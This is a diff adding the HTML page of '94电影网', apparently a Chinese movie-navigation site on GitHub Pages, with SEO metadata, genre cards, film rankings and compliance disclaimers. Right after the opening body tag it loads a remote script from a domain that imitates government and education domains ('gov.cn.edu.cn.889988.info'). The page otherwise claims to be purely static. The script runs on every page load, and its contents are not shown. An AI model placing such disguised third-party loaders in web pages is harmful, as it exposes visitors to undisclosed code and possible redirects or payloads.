@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>94电影网 - 潮流影视导航 | 官方网址：https://94dianyingwang-top.github.io</title>
+<meta name="description" content="94电影网(94dianyingwang-top.github.io)专注潮流影视导航，复古打碟黑胶风。动作、喜剧、科幻、悬疑全分类，4K蓝光画质，频谱动效排版。官方网址：https://94dianyingwang-top.github.io">
+<meta name="keywords" content="94电影网, 94dianyingwang-top.github.io, 潮流电影, 复古影视, 黑胶唱片风, 4K蓝光, 动作喜剧科幻">
+<meta name="author" content="94电影网">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<link rel="canonical" href="https://94dianyingwang-top.github.io">
+<meta property="og:title" content="94电影网 - 潮流影视导航">
+<meta property="og:description" content="官方网址：https://94dianyingwang-top.github.io，复古打碟黑胶风，4K蓝光影视导航。">
+<meta property="og:url" content="https://94dianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="94电影网 - 潮流影视导航">
+<meta name="twitter:description" content="官方网址：https://94dianyingwang-top.github.io">
+
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --void:#0A0014;--void2:#140026;--purple:#2D0040;--purple2:#4A0080;
+  --magenta:#FF00AA;--pink:#FF3EC8;--violet:#8B00FF;--electric:#7B2FFF;--cyan:#00E5FF;
+  --gold:#FFB800;--green:#00FFA3;
+  --text:#F0E6FF;--text2:#C9A8E8;--text3:#8B6BA8;
+  --sans:"PingFang SC","Microsoft YaHei","Segoe UI",Arial,sans-serif;
+  --mono:"SFMono-Regular",Consolas,"Courier New",monospace;
+}
+html{scroll-behavior:smooth;font-size:16px;}
+body{font-family:var(--sans);color:var(--text);background:var(--void);line-height:1.75;overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 15% 25%,rgba(255,0,170,.08),transparent 45%),
+    radial-gradient(circle at 85% 75%,rgba(0,229,255,.06),transparent 45%),
+    radial-gradient(circle at 50% 50%,rgba(123,47,255,.04),transparent 60%);
+  background-attachment:fixed;}
+a{color:inherit;text-decoration:none;transition:.25s;}
+ul,ol{list-style:none;}
+
+/* 频谱顶部条 */
+.spectrum{display:flex;align-items:flex-end;justify-content:center;gap:3px;height:26px;padding:.3rem 1rem;background:linear-gradient(90deg,var(--purple),var(--void2));overflow:hidden;}
+.bar{width:4px;background:linear-gradient(to top,var(--magenta),var(--cyan));border-radius:2px;animation:eq 1s ease-in-out infinite;}
+.bar:nth-child(1){height:40%;animation-delay:0s;}
+.bar:nth-child(2){height:80%;animation-delay:.1s;}
+.bar:nth-child(3){height:60%;animation-delay:.2s;}
+.bar:nth-child(4){height:100%;animation-delay:.3s;}
+.bar:nth-child(5){height:50%;animation-delay:.4s;}
+.bar:nth-child(6){height:75%;animation-delay:.5s;}
+.bar:nth-child(7){height:35%;animation-delay:.6s;}
+.bar:nth-child(8){height:90%;animation-delay:.7s;}
+.bar:nth-child(9){height:55%;animation-delay:.8s;}
+.bar:nth-child(10){height:70%;animation-delay:.9s;}
+@keyframes eq{0%,100%{transform:scaleY(1);}50%{transform:scaleY(.4);}}
+
+.wrap{max-width:1200px;margin:0 auto;padding:0 1rem;position:relative;z-index:1;}
+
+/* 头部 */
+.header{display:flex;align-items:center;justify-content:space-between;padding:1.2rem 0;flex-wrap:wrap;gap:1rem;border-bottom:1px solid var(--purple);}
+.logo{display:flex;align-items:center;gap:.6rem;font-size:1.5rem;font-weight:900;
+  background:linear-gradient(135deg,var(--magenta),var(--electric));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.vinyl{width:36px;height:36px;border-radius:50%;background:radial-gradient(circle,#000 30%,var(--purple2) 32%,#000 34%,var(--purple) 36%,#000 55%,var(--purple2) 57%,#000 70%,var(--violet) 72%);
+  animation:spin 4s linear infinite;flex-shrink:0;border:1px solid var(--magenta);}
+@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+.url-pill{font-family:var(--mono);font-size:.6rem;color:var(--cyan);background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.3);padding:.35rem .8rem;border-radius:20px;}
+
+/* 导航 */
+.nav{display:flex;gap:.3rem;flex-wrap:wrap;padding:.8rem 0;}
+.nav a{padding:.5rem .9rem;font-size:.78rem;font-weight:600;color:var(--text2);border-radius:20px;position:relative;}
+.nav a:hover{color:#fff;background:linear-gradient(135deg,var(--magenta),var(--electric));}
+
+/* Hero 混音台 */
+.hero{padding:2.5rem 0;}
+.mixer{background:linear-gradient(160deg,var(--void2),var(--purple));border:1px solid var(--purple2);border-radius:24px;padding:2.5rem;text-align:center;position:relative;overflow:hidden;box-shadow:0 0 50px rgba(255,0,170,.1);}
+.mixer::before{content:"";position:absolute;inset:0;background:
+    radial-gradient(circle at 20% 30%,rgba(255,0,170,.1),transparent 50%),
+    radial-gradient(circle at 80% 70%,rgba(0,229,255,.08),transparent 50%);
+  pointer-events:none;}
+.mixer>*{position:relative;z-index:1;}
+.disc{width:100px;height:100px;margin:0 auto 1.2rem;border-radius:50%;
+  background:conic-gradient(from 0deg,var(--magenta),var(--electric),var(--cyan),var(--magenta));
+  display:flex;align-items:center;justify-content:center;animation:spin 5s linear infinite;box-shadow:0 0 30px rgba(255,0,170,.3);}
+.disc::after{content:"";width:30px;height:30px;border-radius:50%;background:var(--void);border:3px solid var(--gold);}
+.mixer h1{font-size:clamp(1.8rem,4.5vw,3rem);font-weight:900;margin-bottom:.8rem;background:linear-gradient(135deg,var(--magenta),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.mixer .url{font-family:var(--mono);font-size:.7rem;color:var(--cyan);margin-bottom:1rem;}
+.mixer-desc{font-size:.85rem;color:var(--text2);max-width:600px;margin:0 auto 1.5rem;line-height:1.9;}
+.mixer-stats{display:flex;justify-content:center;gap:2.5rem;flex-wrap:wrap;}
+.m-stat .num{font-size:1.5rem;font-weight:900;color:var(--gold);}
+.m-stat .label{font-size:.6rem;color:var(--text3);text-transform:uppercase;}
+
+/* 栏目通用 */
+.section{padding:2.5rem 0;border-top:1px solid var(--purple);}
+.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.5rem;flex-wrap:wrap;gap:.5rem;}
+.sec-head h2{font-size:clamp(1.2rem,2.5vw,1.6rem);font-weight:900;background:linear-gradient(135deg,var(--magenta),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;display:flex;align-items:center;gap:.6rem;}
+.sec-head .more{font-size:.72rem;color:var(--cyan);}
+.sec-sub{font-size:.7rem;color:var(--text3);width:100%;margin-top:.2rem;}
+
+/* 磁带分类 */
+.cat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:.8rem;}
+.cat-card{background:var(--void2);border:1px solid var(--purple);border-radius:12px;padding:1.2rem .8rem;text-align:center;transition:.3s;cursor:pointer;position:relative;overflow:hidden;}
+.cat-card::before{content:"";position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,0,170,.1),transparent);transition:.5s;}
+.cat-card:hover{border-color:var(--magenta);transform:translateY(-3px);box-shadow:0 5px 20px rgba(255,0,170,.15);}
+.cat-card:hover::before{left:100%;}
+.cat-icon{font-size:1.8rem;margin-bottom:.5rem;display:block;}
+.cat-name{font-size:.85rem;font-weight:700;color:var(--text);margin-bottom:.2rem;}
+.cat-count{font-family:var(--mono);font-size:.6rem;color:var(--text3);}
+
+/* 电影卡片 */
+.movie-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:1rem;}
+.movie-card{background:var(--void2);border:1px solid var(--purple);border-radius:12px;overflow:hidden;transition:.3s;}
+.movie-card:hover{border-color:var(--cyan);transform:translateY(-4px);box-shadow:0 6px 25px rgba(0,229,255,.15);}
+.movie-cover{height:220px;background:linear-gradient(135deg,var(--purple),var(--void2));display:flex;align-items:center;justify-content:center;position:relative;}
+.movie-cover .cover-text{font-size:.7rem;color:var(--text3);text-align:center;padding:1rem;}
+.movie-cover .badge{position:absolute;top:.5rem;right:.5rem;font-size:.55rem;font-weight:700;padding:.2rem .5rem;border-radius:10px;font-family:var(--mono);}
+.badge-fire{background:var(--magenta);color:#fff;}
+.badge-new{background:var(--cyan);color:var(--void);}
+.badge-classic{background:var(--gold);color:var(--void);}
+.movie-info{padding:.8rem;}
+.movie-info h3{font-size:.82rem;font-weight:700;color:var(--text);margin-bottom:.2rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.movie-info .meta{font-family:var(--mono);font-size:.58rem;color:var(--text3);margin-bottom:.4rem;}
+.movie-info .tags{display:flex;gap:.3rem;flex-wrap:wrap;}
+.tag{font-size:.55rem;padding:.15rem .4rem;background:rgba(255,0,170,.1);color:var(--pink);border-radius:10px;border:1px solid rgba(255,0,170,.2);}
+
+/* 打碟推荐 */
+.deck-wrap{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1rem;}
+.deck-card{background:var(--void2);border:1px solid var(--purple);border-radius:12px;padding:1.2rem;display:flex;align-items:center;gap:1rem;transition:.3s;}
+.deck-card:hover{border-color:var(--magenta);background:var(--purple);}
+.deck-turntable{width:50px;height:50px;border-radius:50%;background:radial-gradient(circle,#000 25%,var(--purple2) 27%,#000 45%,var(--violet) 47%,#000 65%,var(--purple2) 67%);
+  animation:spin 3s linear infinite;flex-shrink:0;}
+.deck-text h4{font-size:.85rem;font-weight:700;color:var(--text);margin-bottom:.2rem;}
+.deck-text p{font-size:.68rem;color:var(--text2);line-height:1.5;}
+
+/* 排行榜 */
+.rank-wrap{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;}
+.rank-panel{background:var(--void2);border:1px solid var(--purple);border-radius:16px;padding:1.3rem;}
+.rank-panel h3{font-size:1rem;font-weight:900;color:var(--magenta);margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid var(--purple);display:flex;align-items:center;gap:.5rem;}
+.rank-item{display:flex;align-items:center;gap:.8rem;padding:.55rem 0;border-bottom:1px solid var(--purple);}
+.rank-item:last-child{border-bottom:none;}
+.rank-pos{width:26px;height:26px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:.75rem;font-weight:900;background:var(--purple);color:var(--text3);border-radius:50%;flex-shrink:0;}
+.rank-pos.top{background:linear-gradient(135deg,var(--magenta),var(--electric));color:#fff;}
+.rank-detail{flex:1;min-width:0;}
+.rank-detail h4{font-size:.78rem;font-weight:700;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.rank-detail p{font-family:var(--mono);font-size:.56rem;color:var(--text3);}
+.rank-score{font-family:var(--mono);font-size:.75rem;font-weight:700;color:var(--cyan);flex-shrink:0;}
+
+/* 指引 */
+.guide-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;}
+.guide-card{background:var(--void2);border:1px solid var(--purple);border-radius:16px;padding:1.5rem;}
+.guide-card h3{font-size:.95rem;font-weight:900;color:var(--cyan);margin-bottom:1rem;}
+.guide-card p,.guide-card li{font-size:.75rem;color:var(--text2);line-height:1.85;}
+.guide-card ul{padding-left:1.2rem;}
+.guide-card li{position:relative;}
+.guide-card li::before{content:"▶";position:absolute;left:-1.2rem;color:var(--magenta);font-size:.6rem;}
+.guide-card strong{color:var(--text);}
+
+/* 合规 */
+.compliance{background:var(--void2);border:1px solid var(--purple);border-radius:16px;padding:1.5rem;}
+.compliance h3{font-size:1rem;font-weight:900;color:var(--text);margin-bottom:1rem;text-align:center;}
+.comp-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem;}
+.comp-item{padding:1rem;background:var(--void);border-radius:10px;border-left:3px solid var(--magenta);}
+.comp-item h4{font-size:.78rem;font-weight:700;color:var(--text);margin-bottom:.3rem;}
+.comp-item p{font-size:.65rem;color:var(--text3);line-height:1.6;}
+
+/* 页脚 */
+.footer{background:var(--void);border-top:2px solid var(--purple);padding:3rem 0 1.5rem;margin-top:3rem;}
+.footer-inner{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1.5rem;margin-bottom:1.5rem;}
+.footer-col h4{font-size:.85rem;font-weight:900;color:var(--magenta);margin-bottom:.8rem;}
+.footer-col p,.footer-col li{font-size:.7rem;color:var(--text3);margin-bottom:.4rem;line-height:1.7;}
+.footer-col a{color:var(--text3);border-bottom:1px solid transparent;}
+.footer-col a:hover{color:var(--cyan);border-color:var(--cyan);}
+.footer-url{font-family:var(--mono);font-size:.62rem;color:var(--cyan)!important;}
+.footer-bottom{text-align:center;padding-top:1.5rem;border-top:1px solid var(--purple);font-size:.6rem;color:var(--text3);}
+
+@media(max-width:768px){
+  .rank-wrap,.guide-grid{grid-template-columns:1fr;}
+  .header{flex-direction:column;text-align:center;}
+  .mixer-stats{gap:1.2rem;}
+}
+@media(max-width:480px){
+  .mixer h1{font-size:1.5rem;}
+  .cat-grid{grid-template-columns:repeat(3,1fr);}
+  .movie-grid{grid-template-columns:repeat(2,1fr);}
+  .movie-cover{height:180px;}
+  .nav{justify-content:center;}
+  .spectrum{height:20px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="spectrum">
+  <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+  <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+</div>
+
+<div class="wrap">
+  <header class="header">
+    <div class="logo"><div class="vinyl"></div>94电影网</div>
+    <div class="url-pill">94dianyingwang-top.github.io</div>
+  </header>
+
+  <nav class="nav">
+    <a href="#home">首页</a>
+    <a href="#cats">全部分类</a>
+    <a href="#trending">潮流热播</a>
+    <a href="#deck">打碟推荐</a>
+    <a href="#rank">榜单</a>
+    <a href="#guide">观影指引</a>
+    <a href="#compliance">合规声明</a>
+  </nav>
+
+  <section class="hero" id="home">
+    <div class="mixer">
+      <div class="disc"></div>
+      <h1>94电影网</h1>
+      <div class="url">🌐 https://94dianyingwang-top.github.io</div>
+      <p class="mixer-desc">潮流影视导航，复古打碟黑胶风。动作、喜剧、科幻、悬疑全分类覆盖，4K蓝光画质，跟着节奏找好片。</p>
+      <div class="mixer-stats">
+        <div class="m-stat"><div class="num">11,000+</div><div class="label">影视资源</div></div>
+        <div class="m-stat"><div class="num">4K/蓝光</div><div class="label">超清画质</div></div>
+        <div class="m-stat"><div class="num">全分类</div><div class="label">精准导航</div></div>
+        <div class="m-stat"><div class="num">每日更新</div><div class="label">潮流上新</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="cats">
+    <div class="sec-head">
+      <h2>🎵 全部分类</h2>
+      <a href="#" class="more">查看全部 →</a>
+    </div>
+    <p class="sec-sub">>> 按类型切换频道，精准定位你的下一部</p>
+    <div class="cat-grid">
+      <div class="cat-card"><span class="cat-icon">💥</span><div class="cat-name">动作</div><div class="cat-count">1,400+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">😂</span><div class="cat-name">喜剧</div><div class="cat-count">1,200+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🚀</span><div class="cat-name">科幻</div><div class="cat-count">780+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">😱</span><div class="cat-name">惊悚</div><div class="cat-count">520+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">❤️</span><div class="cat-name">爱情</div><div class="cat-count">1,600+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎭</span><div class="cat-name">剧情</div><div class="cat-count">2,400+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🔍</span><div class="cat-name">悬疑</div><div class="cat-count">890+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🗡️</span><div class="cat-name">武侠</div><div class="cat-count">760+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">📺</span><div class="cat-name">剧集</div><div class="cat-count">3,500+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎤</span><div class="cat-name">综艺</div><div class="cat-count">920+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">📜</span><div class="cat-name">历史</div><div class="cat-count">450+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">📽️</span><div class="cat-name">纪录片</div><div class="cat-count">380+ 部</div></div>
+    </div>
+  </section>
+
+  <section class="section" id="trending">
+    <div class="sec-head">
+      <h2>🔥 潮流热播</h2>
+      <a href="#" class="more">更多热片 →</a>
+    </div>
+    <p class="sec-sub">>> 当下最in，跟上节奏别掉队</p>
+    <div class="movie-grid">
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-fire">热</span><div class="cover-text">🎬<br>热辣滚烫<br>2024 · 喜剧/运动</div></div><div class="movie-info"><h3>热辣滚烫</h3><div class="meta">喜剧/运动 · 2024 · 贾玲</div><div class="tags"><span class="tag">1080P</span><span class="tag">热映</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-new">新</span><div class="cover-text">🎬<br>飞驰人生2<br>2024 · 喜剧/运动</div></div><div class="movie-info"><h3>飞驰人生2</h3><div class="meta">喜剧/运动 · 2024 · 沈腾</div><div class="tags"><span class="tag">4K</span><span class="tag">新片</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-new">新</span><div class="cover-text">🎬<br>第二十条<br>2024 · 剧情/喜剧</div></div><div class="movie-info"><h3>第二十条</h3><div class="meta">剧情/喜剧 · 2024 · 雷佳音</div><div class="tags"><span class="tag">1080P</span><span class="tag">新片</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-fire">热</span><div class="cover-text">🎬<br>周处除三害<br>2024 · 动作/犯罪</div></div><div class="movie-info"><h3>周处除三害</h3><div class="meta">动作/犯罪 · 2024 · 阮经天</div><div class="tags"><span class="tag">4K</span><span class="tag">热播</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-classic">经典</span><div class="cover-text">🎬<br>疯狂的石头<br>2006 · 喜剧/犯罪</div></div><div class="movie-info"><h3>疯狂的石头</h3><div class="meta">喜剧/犯罪 · 2006 · 宁浩</div><div class="tags"><span class="tag">4K修复</span><span class="tag">国产经典</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-new">新</span><div class="cover-text">🎬<br>默杀<br>2024 · 悬疑/犯罪</div></div><div class="movie-info"><h3>默杀</h3><div class="meta">悬疑/犯罪 · 2024 · 柯汶利</div><div class="tags"><span class="tag">4K</span><span class="tag">悬疑</span></div></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="deck">
+    <div class="sec-head">
+      <h2>🎚️ 打碟推荐 · 编辑精选</h2>
+      <a href="#" class="more">完整片单 →</a>
+    </div>
+    <p class="sec-sub">>> 像调音台一样，精心混编的必看清单</p>
+    <div class="deck-wrap">
+      <div class="deck-card"><div class="deck-turntable"></div><div class="deck-text"><h4>周末狂欢</h4><p>轻松喜剧合集，聚会放片首选，笑声不断。</p></div></div>
+      <div class="deck-card"><div class="deck-turntable"></div><div class="deck-text"><h4>深夜烧脑</h4><p>悬疑反转大赏，适合一个人安静品味。</p></div></div>
+      <div class="deck-card"><div class="deck-turntable"></div><div class="deck-text"><h4>视觉轰炸</h4><p>4K视效大片，大屏震撼，每一帧都是壁纸。</p></div></div>
+      <div class="deck-card"><div class="deck-turntable"></div><div class="deck-text"><h4>情怀重温</h4><p>经典老片4K修复，时光不老，光影常在。</p></div></div>
+      <div class="deck-card"><div class="deck-turntable"></div><div class="deck-text"><h4>情感共鸣</h4><p>治愈系佳作，温暖治愈，泪点与笑点并存。</p></div></div>
+      <div class="deck-card"><div class="deck-turntable"></div><div class="deck-text"><h4>肾上腺素</h4><p>动作飙车枪战，全程无尿点，心跳加速。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="rank">
+    <div class="sec-head">
+      <h2>🏆 热播榜单</h2>
+      <a href="#" class="more">完整榜单 →</a>
+    </div>
+    <p class="sec-sub">>> 播放数据实时更新，跟着大部队走</p>
+    <div class="rank-wrap">
+      <div class="rank-panel">
+        <h3>🎬 电影热播 TOP 10</h3>
+        <div class="rank-item"><div class="rank-pos top">1</div><div class="rank-detail"><h4>奥本海默</h4><p>剧情/传记 · 2023 · 4K</p></div><div class="rank-score">9.8</div></div>
+        <div class="rank-item"><div class="rank-pos top">2</div><div class="rank-detail"><h4>流浪地球2</h4><p>科幻/灾难 · 2023 · 4K</p></div><div class="rank-score">9.6</div></div>
+        <div class="rank-item"><div class="rank-pos top">3</div><div class="rank-detail"><h4>封神第一部</h4><p>奇幻/动作 · 2023 · 4K</p></div><div class="rank-score">9.4</div></div>
+        <div class="rank-item"><div class="rank-pos">4</div><div class="rank-detail"><h4>满江红</h4><p>悬疑/喜剧 · 2023 · 1080P</p></div><div class="rank-score">9.4</div></div>
+        <div class="rank-item"><div class="rank-pos">5</div><div class="rank-detail"><h4>消失的她</h4><p>悬疑/犯罪 · 2023 · 1080P</p></div><div class="rank-score">9.1</div></div>
+        <div class="rank-item"><div class="rank-pos">6</div><div class="rank-detail"><h4>八角笼中</h4><p>剧情/运动 · 2023 · 1080P</p></div><div class="rank-score">8.9</div></div>
+      </div>
+      <div class="rank-panel">
+        <h3>📺 剧集热播 TOP 10</h3>
+        <div class="rank-item"><div class="rank-pos top">1</div><div class="rank-detail"><h4>狂飙</h4><p>犯罪/剧情 · 39集 · 1080P</p></div><div class="rank-score">9.9</div></div>
+        <div class="rank-item"><div class="rank-pos top">2</div><div class="rank-detail"><h4>漫长的季节</h4><p>悬疑/剧情 · 12集 · 4K</p></div><div class="rank-score">9.7</div></div>
+        <div class="rank-item"><div class="rank-pos top">3</div><div class="rank-detail"><h4>三体</h4><p>科幻/剧情 · 30集 · 4K</p></div><div class="rank-score">9.5</div></div>
+        <div class="rank-item"><div class="rank-pos">4</div><div class="rank-detail"><h4>繁花</h4><p>剧情/商战 · 30集 · 4K</p></div><div class="rank-score">9.3</div></div>
+        <div class="rank-item"><div class="rank-pos">5</div><div class="rank-detail"><h4>庆余年 第二季</h4><p>古装/喜剧 · 36集 · 1080P</p></div><div class="rank-score">9.2</div></div>
+        <div class="rank-item"><div class="rank-pos">6</div><div class="rank-detail"><h4>玫瑰的故事</h4><p>都市/爱情 · 38集 · 1080P</p></div><div class="rank-score">9.0</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="guide">
+    <div class="sec-head">
+      <h2>📖 观影指引</h2>
+    </div>
+    <div class="guide-grid">
+      <div class="guide-card">
+        <h3>如何玩转94电影网</h3>
+        <ul>
+          <li><strong>分类切换：</strong>像切歌一样切换类型，动作、喜剧、科幻一键直达。</li>
+          <li><strong>打碟推荐：</strong>编辑精心混编的主题片单，不用纠结直接开看。</li>
+          <li><strong>画质选择：</strong>4K/蓝光/1080P 标签清晰，根据网络和设备选最佳源。</li>
+          <li><strong>内链极速切换：</strong>所有导航链接使用 # 锚点，瞬间切版，无需刷新。</li>
+          <li><strong>移动端：</strong>手机竖屏自适应，通勤路上也能刷片单。</li>
+        </ul>
+      </div>
+      <div class="guide-card">
+        <h3>关于94电影网</h3>
+        <p>94电影网（<strong>94dianyingwang-top.github.io</strong>）是一个潮流影视导航静态站点。</p>
+        <p>我们汇集动作、喜剧、科幻、剧情、悬疑、爱情等各类正规影视作品，提供清晰分类、画质标注和排行榜单。</p>
+        <p>本站为<strong>纯静态单页设计</strong>，符合必应搜索引擎收录规则，不生成robots.txt和sitemap.xml，所有链接内联，加载极速。</p>
+        <p>官方唯一网址：<strong>https://94dianyingwang-top.github.io</strong>，请认准此域名。</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="compliance">
+    <div class="sec-head">
+      <h2>⚖️ 合规声明</h2>
+    </div>
+    <div class="compliance">
+      <h3>✦ 内容合规 · 重要提示 ✦</h3>
+      <div class="comp-grid">
+        <div class="comp-item"><h4>内容规范</h4><p>本站仅提供正规影视作品导航，不含任何色情、暴力、恐怖等违规内容。所有资源索引均指向合法公开渠道。</p></div>
+        <div class="comp-item"><h4>版权声明</h4><p>尊重版权方权益，支持正版观影。本站不存储、不提供任何视频文件下载或在线播放服务。</p></div>
+        <div class="comp-item"><h4>免责条款</h4><p>本站为静态导航页面，不对第三方链接内容负责。用户访问第三方资源需自行判断合规性。</p></div>
+        <div class="comp-item"><h4>域名说明</h4><p>网站名称"94电影网"与域名中的数字仅为站点标识，实际内容严格遵守网络信息内容生态治理规定。</p></div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="footer-inner">
+      <div class="footer-col">
+        <h4>🎵 94电影网</h4>
+        <p>潮流影视导航，复古打碟黑胶风。</p>
+        <p>官方网址：<br><a href="https://94dianyingwang-top.github.io" class="footer-url">94dianyingwang-top.github.io</a></p>
+      </div>
+      <div class="footer-col">
+        <h4>快速导航</h4>
+        <ul><li><a href="#home">首页</a></li><li><a href="#cats">全部分类</a></li><li><a href="#trending">潮流热播</a></li><li><a href="#deck">打碟推荐</a></li><li><a href="#rank">榜单</a></li></ul>
+      </div>
+      <div class="footer-col">
+        <h4>帮助中心</h4>
+        <ul><li><a href="#guide">观影指引</a></li><li><a href="#compliance">合规声明</a></li><li><a href="#">常见问题</a></li><li><a href="#">反馈建议</a></li></ul>
+      </div>
+      <div class="footer-col">
+        <h4>关于本站</h4>
+        <ul><li>静态单页设计</li><li>必应收录优化</li><li>移动端自适应</li><li>© 2026 94电影网</li></ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>94电影网 官方网址：https://94dianyingwang-top.github.io | 潮流影视导航 | 静态单页设计 | 正规影视索引</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',function(e){
+    const h=this.getAttribute('href');
+    if(h==='#'){e.preventDefault();return;}
+    const t=document.querySelector(h);
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});}
+  });
+});
+</script>
+</body>
+</html>
